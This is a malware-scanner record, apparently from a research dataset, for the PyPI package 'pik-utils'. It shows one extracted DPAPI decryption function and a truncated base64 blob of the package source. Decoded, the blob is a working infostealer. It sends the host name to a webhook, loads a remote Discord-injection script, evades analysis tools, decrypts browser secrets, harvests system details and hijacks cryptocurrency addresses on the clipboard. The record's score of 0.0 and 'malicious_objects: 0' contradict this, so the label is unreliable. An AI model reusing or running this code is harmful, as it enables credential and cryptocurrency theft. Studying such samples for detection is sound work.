statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pik-utils/1.0.2/pik-utils-1.0.2/pik-utils-1.0.2/pik-utils/__init__.py
  contents:
  - name: CryptUnprotectData
    score: 0.0
    code: |-
      def CryptUnprotectData(encrypted_bytes, entropy=b""):
          buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
          buffer_entropy = c_buffer(entropy, len(entropy))
          blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
          blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
          blob_out = DATA_BLOB()

          if windll.crypt32.CryptUnprotectData(
              byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
          ):
              return GetData(blob_out)
    tokens: TARGETED_FILE resume load_global c_buffer load_fast encrypted_bytes load_global len load_fast encrypted_bytes call call store_fast buffer_in load_global c_buffer load_fast entropy load_global len load_fast entropy call call store_fast buffer_entropy load_global DATA_BLOB load_global len load_fast encrypted_bytes call load_fast buffer_in call store_fast blob_in load_global DATA_BLOB load_global len load_fast entropy call load_fast buffer_entropy call store_fast blob_entropy load_global DATA_BLOB call store_fast blob_out load_global windll load_attr crypt32 load_attr STRING_LEN_S_ENT_HIGH load_global byref load_fast blob_in call load_const load_global byref load_fast blob_entropy call load_const load_const load_const INTEGER load_global byref load_fast blob_out call call pop_jump_if_false TO_NUMBER load_global GetData load_fast blob_out call return_value return_const None
    hash: 1f76b22ee9f284fa785b0c8934f270df88ba51333f7175f026117d0fc29f5787
sources:
  .repo_cache/malicious_repos/pypi_malregistry/pik-utils/1.0.2/pik-utils-1.0.2/pik-utils-1.0.2/pik-utils/__init__.py: aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMgaHR0cHgiKQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IG9zCmltcG9ydCBodHRweApkYXRhID0gewogICAgICAgICdlbWJlZHMnOiBbewogICAgICAgICAgICAidGl0bGUiOiAiU29tZW9uZSBUcmllZCB0byBkb3dubG9hZCIsCiAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6ICJQQyBVc2VybmFtZSA9IiArIG9zLmdldGVudigiQ09NUFVURVJOQU1FIikKICAgICAgICAgICAgfV0KICAgICAgICAgICAgCiAgICB9Cmh0dHB4LnBvc3QoImh0dHBzOi8vazhjN254ZzZyaWFxOW51ZWxuNndqZC5ob29rcy53ZWJob29rcmVsYXkuY29tLyIsIGpzb249ZGF0YSkKb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBodHRweCBweXBlcmNsaXAgcHlvdHAgd2lucmVnaXN0cnkgcHN1dGlsIHB5Y3J5cHRvZG9tZSBQSUwtdG9vbHMgYXN5bmNpbyB0aHJlYWRlZCByZXF1ZXN0cyBkYXRldGltZSBjb2xvcmFtYSBwaWxsb3cgY3VzdG9tdGtpbnRlciBweWZpZ2xldCB0cWRtIHB5cGl3aW4zMiBweXdpbjMyIikKaW1wb3J0IGFzeW5jaW8KaW1wb3J0IGpzb24KaW1wb3J0IG50cGF0aAppbXBvcnQgcmFuZG9tCmltcG9ydCByZQppbXBvcnQgc2h1dGlsCmltcG9ydCBzcWxpdGUzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHdpbnJlZwppbXBvcnQgemlwZmlsZQppbXBvcnQgcHN1dGlsCmltcG9ydCBiYXNlNjQKaW1wb3J0IGN0eXBlcwppbXBvcnQgdGltZQppbXBvcnQgcHlwZXJjbGlwCmltcG9ydCB3aW4zMmd1aQppbXBvcnQgd2luMzJjb24KCgpmcm9tIHNxbGl0ZTMgaW1wb3J0IGNvbm5lY3QKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20gc2h1dGlsIGltcG9ydCBjb3B5Mgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhLCB0aW1lem9uZQpmcm9tIHN5cyBpbXBvcnQgYXJndgpmcm9tIHRlbXBmaWxlIGltcG9ydCBnZXR0ZW1wZGlyLCBta2R0ZW1wCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmZyb20gY3R5cGVzIGltcG9ydCB3aW5kbGwsIHdpbnR5cGVzLCBieXJlZiwgY2RsbCwgU3RydWN0dXJlLCBQT0lOVEVSLCBjX2NoYXIsIGNfYnVmZmVyCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKZnJvbSB3aW4zMmNyeXB0IGltcG9ydCBDcnlwdFVucHJvdGVjdERhdGEKCgpsb2NhbCA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikKcm9hbWluZyA9IG9zLmdldGVudigiQVBQREFUQSIpCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQoKTm90UFNTVyA9IFtdCgoKX19jb25maWdfXyA9IHsKICAgICJ5b3Vyd2ViaG9va3VybCI6ICJodHRwczovL2s4YzdueGc2cmlhcTludWVsbjZ3amQuaG9va3Mud2ViaG9va3JlbGF5LmNvbS8iLAogICAgImJjX2luamVjdGlvbl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvQmxhY2tDYXAtSW5qZWN0L21haW4vaW5kZXguanMiLAogICAgImhpZGUiOiAieWVzIiwKICAgICJwaW5nIjogInllcyIsCiAgICAicGluZ3R5cGUiOiAiZXZlcnlvbmUiLAogICAgImZha2VfZXJyb3IiOiAibm8iLAogICAgInN0YXJ0dXAiOiAibm8iLAogICAgImtpbGxfZGlzY29yZF9wcm9jZXNzIjogIiVraWxsX2Rpc2NvcmRfcHJvY2VzcyUiLAogICAgImRidWdraWxsZXIiOiAiJV9kZWJ1Z2tpbGxlciUiLAogICAgImFkZHJlc3NlX2NyeXB0b19yZXBsYWNlciI6ICJubyIsCiAgICAiYWRkcmVzc2VfYnRjIjogIm5vbmUiLAogICAgImFkZHJlc3NlX2V0aCI6ICJub25lIiwKICAgICJhZGRyZXNzZV94Y2hhaW4iOiAibm9uZSIsCiAgICAiYWRkcmVzc2VfcGNoYWluIjogIm5vbmUiLAogICAgImFkZHJlc3NlX2NjaGFpbiI6ICJub25lIiwKICAgICJhZGRyZXNzZV9tb25lcm8iOiAibm9uZSIsCiAgICAiYWRkcmVzc2VfYWRhIjogIm5vbmUiLAogICAgImFkZHJlc3NlX2Rhc2giOiAibm9uZSIsCiAgICAiYmxwcmdnZyI6IFsKICAgICAgICAiaHR0cGRlYnVnZ2VydWkiLAogICAgICAgICJ3aXJlc2hhcmsiLAogICAgICAgICJmaWRkbGVyIiwKICAgICAgICAicmVnZWRpdCIsCiAgICAgICAgImNtZCIsCiAgICAgICAgInRhc2ttZ3IiLAogICAgICAgICJ2Ym94c2VydmljZSIsCiAgICAgICAgImRmNXNlcnYiLAogICAgICAgICJwcm9jZXNzaGFja2VyIiwKICAgICAgICAidmJveHRyYXkiLAogICAgICAgICJ2bXRvb2xzZCIsCiAgICAgICAgInZtd2FyZXRyYXkiLAogICAgICAgICJpZGE2NCIsCiAgICAgICAgIm9sbHlkYmciLAogICAgICAgICJwZXN0dWRpbyIsCiAgICAgICAgInZtd2FyZXVzZXIiLAogICAgICAgICJ2Z2F1dGhzZXJ2aWNlIiwKICAgICAgICAidm1hY3RobHAiLAogICAgICAgICJ4OTZkYmciLAogICAgICAgICJ2bXNydmMiLAogICAgICAgICJ4MzJkYmciLAogICAgICAgICJ2bXVzcnZjIiwKICAgICAgICAicHJsX2NjIiwKICAgICAgICAicHJsX3Rvb2xzIiwKICAgICAgICAieGVuc2VydmljZSIsCiAgICAgICAgInFlbXUtZ2EiLAogICAgICAgICJqb2Vib3hjb250cm9sIiwKICAgICAgICAia3NkdW1wZXJjbGllbnQiLAogICAgICAgICJrc2R1bXBlciIsCiAgICAgICAgImpvZWJveHNlcnZlciIsCiAgICBdLAp9CgoKbG9naW5faW5mbyA9IG9zLmdldGxvZ2luKCkKY29tcHV0ZXJfdmljdGltID0gb3MuZ2V0ZW52KCJDT01QVVRFUk5BTUUiKQpmYXN0X21lbW9yeV9zdG9yYWdlID0gc3RyKHBzdXRpbC52aXJ0dWFsX21lbW9yeSgpWzBdIC8gMTAyNCoqMykuc3BsaXQoIi4iKVswXQpzdG9yYWdlX3NwYWNlID0gc3RyKHBzdXRpbC5kaXNrX3VzYWdlKCIvIilbMF0gLyAxMDI0KiozKS5zcGxpdCgiLiIpWzBdCgpiY19teXJlZ2V4X3NlY3JldCA9ICJodHRwczovL3Bhc3RlLmJpbmduZXIuY29tL3Bhc3RlL3U3cW9qL3JhdyIKcmVnX3JlcSA9IHJlcXVlc3RzLmdldChiY19teXJlZ2V4X3NlY3JldCkKcmVneF9uZXQgPSByIltcdy1dezI0fVwuIiArIHJlZ19yZXEudGV4dAoKCmNsYXNzIEZ1bmN0aW9ucyhvYmplY3QpOgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIHRpbWVfY29udmVydGlvbih0aW1lOiBpbnQgb3IgZmxvYXQpIC0+IHN0cjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGVwb2NoID0gZGF0ZXRpbWUoMTYwMSwgMSwgMSwgdHppbmZvPXRpbWV6b25lLnV0YykKICAgICAgICAgICAgY29kZXN0YW1wID0gZXBvY2ggKyB0aW1lZGVsdGEobWljcm9zZWNvbmRzPXRpbWUpCiAgICAgICAgICAgIHJldHVybiBjb2Rlc3RhbXAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIG15a2V5X2d0bShwYXRoOiBzdHIgb3Igb3MuUGF0aExpa2UpOgogICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGMgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICAgICAgcmV0dXJuIEZ1bmN0aW9ucy5kZWNyeXB0X3dpbmRvd3MobWFzdGVyX2tleVs1Ol0pCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICByZXR1cm4gTm9uZQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBmaWxlc19jcmVhdGluZyhfZGlyOiBzdHIgb3Igb3MuUGF0aExpa2UgPSBnZXR0ZW1wZGlyKCkpOgogICAgICAgIGYxbGVub20gPSAiIi5qb2luKAogICAgICAgICAgICByYW5kb20uU3lzdGVtUmFuZG9tKCkuY2hvaWNlKAogICAgICAgICAgICAgICAgImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IgogICAgICAgICAgICApCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHJhbmRvbS5yYW5kaW50KDEwLCAyMCkpCiAgICAgICAgKQogICAgICAgIHBhdGggPSBudHBhdGguam9pbihfZGlyLCBmMWxlbm9tKQogICAgICAgIG9wZW4ocGF0aCwgIngiKQogICAgICAgIHJldHVybiBwYXRoCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGhlYWRlcl9tYWtpbmcodG9rZW46IHN0ciA9IE5vbmUpOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgfQogICAgICAgIGlmIHRva2VuOgogICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pCiAgICAgICAgcmV0dXJuIGhlYWRlcnMKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZGVjcnlwdF93aW5kb3dzKGVuY3J5cHRlZF9zdHI6IGJ5dGVzKSAtPiBzdHI6CiAgICAgICAgcmV0dXJuIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfc3RyLCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBpbmZvX3N5cygpIC0+IGxpc3Q6CiAgICAgICAgZmxhZyA9IDB4MDgwMDAwMDAKICAgICAgICBzaDEgPSAid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiCiAgICAgICAgc2gyID0gInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoICdIS0xNOlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFNvZnR3YXJlUHJvdGVjdGlvblBsYXRmb3JtJyAtTmFtZSBCYWNrdXBQcm9kdWN0S2V5RGVmYXVsdCIKICAgICAgICBzaDMgPSAicG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24nIC1OYW1lIFByb2R1Y3ROYW1lIgogICAgICAgIHRyeToKICAgICAgICAgICAgd2luZG93c191dWlkID0gKAogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoc2gxLCBjcmVhdGlvbmZsYWdzPWZsYWcpCiAgICAgICAgICAgICAgICAuZGVjb2RlKCkKICAgICAgICAgICAgICAgIC5zcGxpdCgiXG4iKVsxXQogICAgICAgICAgICAgICAgLnN0cmlwKCkKICAgICAgICAgICAgKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHdpbmRvd3NfdXVpZCA9ICJOL0EiCiAgICAgICAgdHJ5OgogICAgICAgICAgICBrZXlfd2luZG93c19maW5kID0gKAogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoc2gyLCBjcmVhdGlvbmZsYWdzPWZsYWcpLmRlY29kZSgpLnJzdHJpcCgpCiAgICAgICAgICAgICkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBrZXlfd2luZG93c19maW5kID0gIk4vQSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIG5ldmVyX3dpbmQgPSAoCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDMsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkucnN0cmlwKCkKICAgICAgICAgICAgKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIG5ldmVyX3dpbmQgPSAiTi9BIgogICAgICAgIHJldHVybiBbd2luZG93c191dWlkLCBuZXZlcl93aW5kLCBrZXlfd2luZG93c19maW5kXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiB2YWx1ZV9kZWNyeXB0KGJ1ZmYsIG1hc3Rlcl9rZXkpIC0+IHN0cjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBmJ0ZhaWxlZCB0byBkZWNyeXB0ICJ7c3RyKGJ1ZmYpfSIgfCBrZXk6ICJ7c3RyKG1hc3Rlcl9rZXkpfSInCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGZpbmRfaW5fY29uZmlnKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgICAgIHJldHVybiBfX2NvbmZpZ19fLmdldChlKQogICAgCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgaW5mb19uZXR3b3JkKCkgLT4gbGlzdDoKICAgICAgICBpcCwgY2l0eSwgY291bnRyeSwgcmVnaW9uLCBvcmcsIGxvYywgZ29vZ2xlbWFwID0gKAogICAgICAgICAgICAiTm9uZSIsCiAgICAgICAgICAgICJOb25lIiwKICAgICAgICAgICAgIk5vbmUiLAogICAgICAgICAgICAiTm9uZSIsCiAgICAgICAgICAgICJOb25lIiwKICAgICAgICAgICAgIk5vbmUiLAogICAgICAgICAgICAiTm9uZSIsCiAgICAgICAgKQogICAgICAgIHJlcSA9IGh0dHB4LmdldCgiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIpCiAgICAgICAgaWYgcmVxLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZGF0YSA9IHJlcS5qc29uKCkKICAgICAgICAgICAgaXAgPSBkYXRhLmdldCgiaXAiKQogICAgICAgICAgICBjaXR5ID0gZGF0YS5nZXQoImNpdHkiKQogICAgICAgICAgICBjb3VudHJ5ID0gZGF0YS5nZXQoImNvdW50cnkiKQogICAgICAgICAgICByZWdpb24gPSBkYXRhLmdldCgicmVnaW9uIikKICAgICAgICAgICAgb3JnID0gZGF0YS5nZXQoIm9yZyIpCiAgICAgICAgICAgIGxvYyA9IGRhdGEuZ2V0KCJsb2MiKQogICAgICAgICAgICBnb29nbGVtYXAgPSAiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzL3NlYXJjaC9nb29nbGUrbWFwKysiICsgbG9jCiAgICAgICAgcmV0dXJuIFtpcCwgY2l0eSwgY291bnRyeSwgcmVnaW9uLCBvcmcsIGxvYywgZ29vZ2xlbWFwXQoKCmNsYXNzIGF1dG9fY29weV93YWxsZXQoRnVuY3Rpb25zKToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmFkZHJlc3Nfc3QzYWxlciA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX2NyeXB0b19yZXBsYWNlciIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2J0YyA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX2J0YyIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2V0aCA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX2V0aCIpCiAgICAgICAgc2VsZi5hZGRyZXNzX3hjaGFpbiA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX3hjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX3BjaGFpbiA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX3BjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2NjaGFpbiA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX2NjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX21vbmVybyA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX21vbmVybyIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2FkYSA9IHNlbGYuZmluZF9pbl9jb25maWcoImFkZHJlc3NlX2FkYSIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2Rhc2ggPSBzZWxmLmZpbmRfaW5fY29uZmlnKCJhZGRyZXNzZV9kYXNoIikKCiAgICBkZWYgYWRkcmVzc19zd2FwKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpcGJvYXJkX2RhdGEgPSBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goIl5bMTNdW2Eta20tekEtSEotTlAtWjEtOV17MjUsMzR9JCIsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2J0YywKICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZXRoLAogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRkcmVzc194Y2hhaW4sCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3BjaGFpbiwKICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfY2NoYWluLAogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRkcmVzc19tb25lcm8sCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2FkYSwKICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZGFzaCwKICAgICAgICAgICAgICAgIF06CiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX2J0YyAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19idGMpCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgiXjB4W2EtZkEtRjAtOV17NDB9JCIsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19ldGgpCiAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goCiAgICAgICAgICAgICAgICAiXihbWF18W2Eta20tekEtSEotTlAtWjEtOV17MzYsNzJ9KS1bYS16QS1aXXsxLDgzfTFbcXB6cnk5eDhnZjJ0dmR3MHMzam41NGtoY2U2bXVhN2xdezM4fSQiLAogICAgICAgICAgICAgICAgY2xpcGJvYXJkX2RhdGEsCiAgICAgICAgICAgICk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfeGNoYWluICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gWwogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYnRjLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZXRoLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfeGNoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfcGNoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfY2NoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfbW9uZXJvLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYWRhLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZGFzaCwKICAgICAgICAgICAgICAgICAgICBdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfeGNoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goCiAgICAgICAgICAgICAgICAiXihbUF18W2Eta20tekEtSEotTlAtWjEtOV17MzYsNzJ9KS1bYS16QS1aXXsxLDgzfTFbcXB6cnk5eDhnZjJ0dmR3MHMzam41NGtoY2U2bXVhN2xdezM4fSQiLAogICAgICAgICAgICAgICAgY2xpcGJvYXJkX2RhdGEsCiAgICAgICAgICAgICk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfcGNoYWluICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gWwogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYnRjLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZXRoLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfeGNoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfcGNoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfY2NoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfbW9uZXJvLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYWRhLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZGFzaCwKICAgICAgICAgICAgICAgICAgICBdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfcGNoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goCiAgICAgICAgICAgICAgICAiXihbQ118W2Eta20tekEtSEotTlAtWjEtOV17MzYsNzJ9KS1bYS16QS1aXXsxLDgzfTFbcXB6cnk5eDhnZjJ0dmR3MHMzam41NGtoY2U2bXVhN2xdezM4fSQiLAogICAgICAgICAgICAgICAgY2xpcGJvYXJkX2RhdGEsCiAgICAgICAgICAgICk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfY2NoYWluICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gWwogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYnRjLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZXRoLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfeGNoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfcGNoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfY2NoYWluLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfbW9uZXJvLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYWRhLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfZGFzaCwKICAgICAgICAgICAgICAgICAgICBdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfY2NoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goImFkZHIxW2EtejAtOV0rIiwgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFsKICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYnRjLAogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRkcmVzc19ldGgsCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3hjaGFpbiwKICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfcGNoYWluLAogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRkcmVzc19jY2hhaW4sCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX21vbmVybywKICAgICAgICAgICAgICAgICAgICBzZWxmLmFkZHJlc3NfYWRhLAogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRkcmVzc19kYXNoLAogICAgICAgICAgICAgICAgXToKICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfYWRhKQogICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgiL1hbMS05QS1ISi1OUC1aYS1rbS16XXszM30kL2ciLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfZGFzaCAhPSAibm9uZSI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFsKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2J0YywKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2V0aCwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3hjaGFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3BjaGFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2NjaGFpbiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX21vbmVybywKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2FkYSwKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGRyZXNzX2Rhc2gsCiAgICAgICAgICAgICAgICAgICAgXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvc